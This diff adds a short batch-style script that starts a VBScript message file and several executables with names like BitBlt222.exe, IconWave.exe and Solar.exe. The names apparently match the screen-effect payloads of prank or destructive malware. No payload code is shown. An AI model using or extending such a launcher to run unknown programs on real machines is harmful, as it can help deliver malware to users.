@@ -1,0 +1,9 @@
+start message[.vbs
+start message[.vbs
+start IconWave.exe
+start mlt.exe
+start wave.exe
+start danilosecagou.exe
+start BitBlt222.exe
+start cubes.exe
+start Solar.exe
